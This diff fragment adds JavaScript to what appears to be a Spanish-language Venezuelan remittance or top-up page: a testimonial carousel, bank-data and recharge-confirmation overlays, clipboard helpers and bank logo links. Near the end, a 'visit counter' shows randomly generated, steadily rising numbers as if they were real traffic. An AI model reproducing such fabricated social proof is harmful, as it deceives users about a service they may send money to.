+          <div class="testimonial-avatar">${testimonial.initials}</div>
+          <div class="testimonial-info">
+            <h4>${testimonial.name}</h4>
+            <p>${testimonial.location}</p>
+            <div class="testimonial-rating">${starsHTML}</div>
+          </div>
+        </div>
+      `;
+      
+      carousel.appendChild(slide);
+      
+      // Crear control dot
+      const dot = document.createElement('div');
+      dot.className = `testimonial-dot ${index === 0 ? 'active' : ''}`;
+      dot.addEventListener('click', () => showTestimonial(index));
+      controls.appendChild(dot);
+    });
+    
+    // Mostrar el primer testimonio
+    showTestimonial(0);
+    
+    // Auto-rotar cada 5 segundos
+    setInterval(() => {
+      currentTestimonialIndex = (currentTestimonialIndex + 1) % testimonials.length;
+      showTestimonial(currentTestimonialIndex);
+    }, 5000);
+  }
+
+  /****************************************************
+   * Configurar Listeners de Botones
+   ****************************************************/
+  function setupEventListeners() {
+    // Overlay de datos bancarios
+    const showBankDataBtn = document.getElementById("showBankDataBtn");
+    if (showBankDataBtn) {
+      showBankDataBtn.addEventListener("click", showBankDataOverlay);
+    }
+    
+    const closeOverlayBtn = document.getElementById("closeOverlayBtn");
+    if (closeOverlayBtn) {
+      closeOverlayBtn.addEventListener("click", hideBankDataOverlay);
+    }
+    
+    // Cerrar overlay al hacer clic fuera del contenido
+    const bankDataOverlay = document.getElementById("bankDataOverlay");
+    if (bankDataOverlay) {
+      bankDataOverlay.addEventListener("click", (e) => {
+        if (e.target === bankDataOverlay) {
+          hideBankDataOverlay();
+        }
+      });
+    }
+    
+    // Checkboxes de aceptación
+    const acceptVerification = document.getElementById("acceptVerification");
+    const acceptTerms = document.getElementById("acceptTerms");
+    
+    if (acceptVerification && acceptTerms) {
+      const checkboxes = [acceptVerification, acceptTerms];
+      checkboxes.forEach(checkbox => {
+        checkbox.addEventListener('change', () => {
+          // Aquí podrías añadir alguna lógica si es necesario
+          console.log("Checkbox changed");
+        });
+      });
+    }
+    
+    // MODIFICADO: Configurar botón para mostrar el video
+    const showVideoBtn = document.getElementById('showVideoBtn');
+    if (showVideoBtn) {
+      showVideoBtn.addEventListener('click', function() {
+        showInitialVideo();
+      });
+    }
+    
+    // MODIFICADO: Configurar botón de cierre de video
+    const videoCloseBtn = document.getElementById('videoCloseBtn');
+    if (videoCloseBtn) {
+      videoCloseBtn.addEventListener('click', function() {
+        if (videoWatched) {
+          closeVideoOverlay();
+        }
+      });
+    }
+    
+    // NUEVO: Configurar botón de "He completado mi recarga"
+    const completedRechargeBtn = document.getElementById('completedRechargeBtn');
+    if (completedRechargeBtn) {
+      completedRechargeBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        showRechargeConfirmation();
+      });
+    }
+    
+    // NUEVO: Configurar botones de confirmación de recarga
+    const rechargeNoBtn = document.getElementById('rechargeNoBtn');
+    const rechargeYesBtn = document.getElementById('rechargeYesBtn');
+    const confirmRechargeCheckbox = document.getElementById('confirmRechargeCheckbox');
+    
+    if (confirmRechargeCheckbox) {
+      confirmRechargeCheckbox.addEventListener('change', function() {
+        if (rechargeYesBtn) {
+          if (this.checked) {
+            rechargeYesBtn.classList.remove('confirmation-btn-disabled');
+          } else {
+            rechargeYesBtn.classList.add('confirmation-btn-disabled');
+          }
+        }
+      });
+    }
+    
+    if (rechargeNoBtn) {
+      rechargeNoBtn.addEventListener('click', function() {
+        hideRechargeConfirmation();
+      });
+    }
+    
+    if (rechargeYesBtn) {
+      rechargeYesBtn.addEventListener('click', function() {
+        if (confirmRechargeCheckbox && confirmRechargeCheckbox.checked) {
+          window.location.href = 'recargaremeex.html';
+        }
+      });
+    }
+    
+    // NUEVO: Configurar botón "Volver a empezar"
+    const startOverBtn = document.getElementById('startOverBtn');
+    if (startOverBtn) {
+      startOverBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        showChangeBankConfirmation();
+      });
+    }
+    
+    // NUEVO: Configurar botones de confirmación de cambio de banco
+    const changeBankCheckbox = document.getElementById('changeBankCheckbox');
+    const stayOnPageBtn = document.getElementById('stayOnPageBtn');
+    const proceedToChangeBtn = document.getElementById('proceedToChangeBtn');
+    
+    if (changeBankCheckbox) {
+      changeBankCheckbox.addEventListener('change', function() {
+        if (proceedToChangeBtn) {
+          if (this.checked) {
+            proceedToChangeBtn.classList.remove('confirmation-btn-disabled');
+          } else {
+            proceedToChangeBtn.classList.add('confirmation-btn-disabled');
+          }
+        }
+      });
+    }
+    
+    if (stayOnPageBtn) {
+      stayOnPageBtn.addEventListener('click', function() {
+        hideChangeBankConfirmation();
+      });
+    }
+    
+    if (proceedToChangeBtn) {
+      proceedToChangeBtn.addEventListener('click', function() {
+        if (changeBankCheckbox && changeBankCheckbox.checked) {
+          window.location.href = 'paso1remeex.html';
+        }
+      });
+    }
+    
+    // NUEVO: Configurar botón "Cambiar banco"
+    const changeBankBtn = document.getElementById('changeBankBtn');
+    if (changeBankBtn) {
+      changeBankBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        showChangeBankConfirmation();
+      });
+    }
+  }
+  
+  /****************************************************
+   * OVERLAYS PARA CONFIRMACIONES
+   ****************************************************/
+  function showRechargeConfirmation() {
+    const overlay = document.getElementById('rechargeConfirmationOverlay');
+    if (!overlay) return;
+    
+    overlay.classList.add('active');
+    document.body.style.overflow = 'hidden'; // Evitar scroll de página
+    
+    // Resetear checkbox
+    const checkbox = document.getElementById('confirmRechargeCheckbox');
+    if (checkbox) checkbox.checked = false;
+    
+    // Deshabilitar botón de continuar
+    const continueBtn = document.getElementById('rechargeYesBtn');
+    if (continueBtn) continueBtn.classList.add('confirmation-btn-disabled');
+  }
+  
+  function hideRechargeConfirmation() {
+    const overlay = document.getElementById('rechargeConfirmationOverlay');
+    if (!overlay) return;
+    
+    overlay.classList.remove('active');
+    document.body.style.overflow = ''; // Restaurar scroll
+  }
+  
+  function showChangeBankConfirmation() {
+    const overlay = document.getElementById('changeBankConfirmationOverlay');
+    if (!overlay) return;
+    
+    overlay.classList.add('active');
+    document.body.style.overflow = 'hidden'; // Evitar scroll de página
+    
+    // Resetear checkbox
+    const checkbox = document.getElementById('changeBankCheckbox');
+    if (checkbox) checkbox.checked = false;
+    
+    // Deshabilitar botón de continuar
+    const continueBtn = document.getElementById('proceedToChangeBtn');
+    if (continueBtn) continueBtn.classList.add('confirmation-btn-disabled');
+  }
+  
+  function hideChangeBankConfirmation() {
+    const overlay = document.getElementById('changeBankConfirmationOverlay');
+    if (!overlay) return;
+    
+    overlay.classList.remove('active');
+    document.body.style.overflow = ''; // Restaurar scroll
+  }
+  
+  /****************************************************
+   * OVERLAY PARA DATOS BANCARIOS
+   ****************************************************/
+  function showBankDataOverlay() {
+    const overlay = document.getElementById('bankDataOverlay');
+    if (!overlay) return;
+    
+    overlay.classList.add('active');
+    document.body.style.overflow = 'hidden'; // Evitar scroll de página
+    
+    // Incrementar contador de veces abierto
+    timesBlurOpened++;
+  }
+  
+  function hideBankDataOverlay() {
+    const overlay = document.getElementById('bankDataOverlay');
+    if (!overlay) return;
+    
+    overlay.classList.remove('active');
+    document.body.style.overflow = ''; // Restaurar scroll
+  }
+
+  /****************************************************
+   * UTILIDADES
+   ****************************************************/
+  function formatNumberVE(num) {
+    return Number(num).toLocaleString("es-VE", {
+      minimumFractionDigits: 2,
+      maximumFractionDigits: 2,
+    });
+  }
+
+  function copyToClipboard(elementId) {
+    let text;
+    if (elementId === 'verificacionNumero' || elementId === 'verificacionRif' || elementId === 'verificacionMonto' || elementId === 'conceptoRecarga') {
+      text = document.getElementById(elementId).textContent;
+    } else if (typeof elementId === 'string' && !document.getElementById(elementId)) {
+      text = elementId;
+    } else {
+      const el = document.getElementById(elementId);
+      if (el) text = el.textContent;
+    }
+    if (!text) return;
+
+    if (navigator.clipboard) {
+      navigator.clipboard.writeText(text)
+        .then(() => {
+          showCopyNotification();
+        })
+        .catch(err => {
+          fallbackCopy(text);
+        });
+    } else {
+      fallbackCopy(text);
+    }
+  }
+  function fallbackCopy(text) {
+    const textarea = document.createElement("textarea");
+    textarea.value = text;
+    textarea.style.position = "fixed";
+    document.body.appendChild(textarea);
+    textarea.focus();
+    textarea.select();
+    try {
+      const successful = document.execCommand('copy');
+      if (successful) {
+        showCopyNotification();
+      } else {
+        alert("No se pudo copiar el texto");
+      }
+    } catch (err) {
+      alert("Error al copiar: " + err);
+    }
+    document.body.removeChild(textarea);
+  }
+  function showCopyNotification() {
+    const notification = document.createElement("div");
+    notification.textContent = "Copiado al portapapeles";
+    notification.style.position = "fixed";
+    notification.style.bottom = "20px";
+    notification.style.left = "50%";
+    notification.style.transform = "translateX(-50%)";
+    notification.style.padding = "10px 16px";
+    notification.style.background = "#1a1f71";
+    notification.style.color = "white";
+    notification.style.borderRadius = "8px";
+    notification.style.boxShadow = "0 4px 12px rgba(0,0,0,0.2)";
+    notification.style.zIndex = "2000";
+    notification.style.opacity = "0";
+    notification.style.transition = "opacity 0.3s ease-in-out";
+
+    document.body.appendChild(notification);
+    setTimeout(() => { notification.style.opacity = "1"; }, 10);
+    setTimeout(() => {
+      notification.style.opacity = "0";
+      setTimeout(() => {
+        document.body.removeChild(notification);
+      }, 300);
+    }, 2000);
+  }
+
+  // Mapeo bancos -> logo
+  const bankLogosMapping = {
+    "Banco de Venezuela, SA": "https://www.bancodevenezuela.com/wp-content/uploads/2023/03/logonuevo.png",
+    "Banco Central de Venezuela": "https://www.bcv.org.ve/sites/default/files/default_images/logo_bcv-04_2.png",
+    "Banco Venezolano de Crédito, SA": "https://www.venezolano.com/images/galeria/108_1.png",
+    "Banco Mercantil, CA": "https://www.mercantilbanco.com/mercprod/images/comunes/logo_popups.gif",
+    "Banco Provincial, SA": "https://upload.wikimedia.org/wikipedia/commons/d/d4/BBVAprovinciallogo.svg",
+    "Banco del Caribe CA, Bancaribe": "https://d3olc33sy92l9e.cloudfront.net/wp-content/themes/bancaribe/images/Bancaribe-LogotipoTurquesa.png",
+    "Banco Exterior CA, Banco Universal": "https://upload.wikimedia.org/wikipedia/commons/thumb/d/d3/Banco-Exterior-VE-logo.png/183px-Banco-Exterior-VE-logo.png",
+    "Banco Caroní CA, Banco Universal": "https://www.bancocaroni.com.ve/wp-content/uploads/elementor/thumbs/Logo-252-x-48-1-qvqyrv33uw6afqa09bf5f2tswrzr0yaos9y59b3tuo.png",
+    "Banesco Banco Universal, CA": "https://banesco-prod-2020.s3.amazonaws.com/wp-content/themes/banescocontigo/assets/images/header/logo.svg.gzip",
+    "Banco Sofitasa Banco Universal, CA": "https://www.sofitasa.com/assets/img/nuevo_logo.png",
+    "Banco Plaza, Banco Universal": "https://plazacdn.s3.amazonaws.com/wp-content/themes/bancoplaza/imagenes/logobancoplaza-2.png",
+    "Banco Fondo Común, CA": "https://www.bfc.com.ve/wp-content/uploads/2021/01/logofos.png",
+    "100% Banco, Banco Comercial, CA": "https://www.100x100banco.com/img/logo.png",
+    "Banco del Tesoro CA, Banco Universal": "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Logo_Banco_del_Tesoro.jpg/320px-Logo_Banco_del_Tesoro.jpg",
+    "Bancrecer SA, Banco Microfinanciero": "https://www.bancrecer.com.ve/images/img/bancrecer-logo.png",
+    "Banco Activo CA, Banco Universal": "https://www.bancoactivo.com/logo.svg",
+    "Bancamiga Banco Universal, CA": "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a3/Bancamiga.png/320px-Bancamiga.png",
+    "Banplus Banco Universal, CA": "https://www.banplus.com/uploads/contenidos/logo_banplus2023.jpg",
+    "Banco Bicentenario del Pueblo, Banco Universal CA": "https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/BancoDigitaldelosTrabajadores.png/320px-BancoDigitaldelosTrabajadores.png",
+    "Banco Nacional de Crédito CA, Banco Universal": "https://www.bncenlinea.com/images/default-source/misc/BNCLogo_rebrand.png"
+  };
+  function normalizeBankName(name) {
+    return name.trim().toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");
+  }
+  const normalizedBankLogosMapping = {};
+  Object.keys(bankLogosMapping).forEach(key => {
+    normalizedBankLogosMapping[normalizeBankName(key)] = bankLogosMapping[key];
+  });
+  function getBankLogoURL(bankName) {
+    const defaultLogo = "https://via.placeholder.com/100x50?text=Banco";
+    if (!bankName) return defaultLogo;
+    const normalizedInput = normalizeBankName(bankName);
+
+    if (normalizedBankLogosMapping[normalizedInput]) {
+      return normalizedBankLogosMapping[normalizedInput];
+    }
+    for (let key in normalizedBankLogosMapping) {
+      if (normalizedInput.includes(key) || key.includes(normalizedInput)) {
+        return normalizedBankLogosMapping[key];
+      }
+    }
+    return defaultLogo;
+  }
+
+  // Iniciar contador de visitas en la página
+  (function initVisitCounter() {
+    // En un escenario real, esto podría ser una petición a un API
+    // Aquí simplemente actualizamos un contador visual
+    let currentVisits = Math.floor(Math.random() * 200) + 300;
+    
+    // Incrementar contador cada cierto tiempo
+    setInterval(() => {
+      // 70% de probabilidad de incrementar
+      if (Math.random() > 0.3) {
+        currentVisits += Math.floor(Math.random() * 3) + 1;
+        // Actualizar un elemento visual si existe
+        const visitCounter = document.getElementById('visitCounter');
+        if (visitCounter) {
+          visitCounter.textContent = currentVisits;
+        }
+      }
+    }, 10000);
+  })();
+</script>
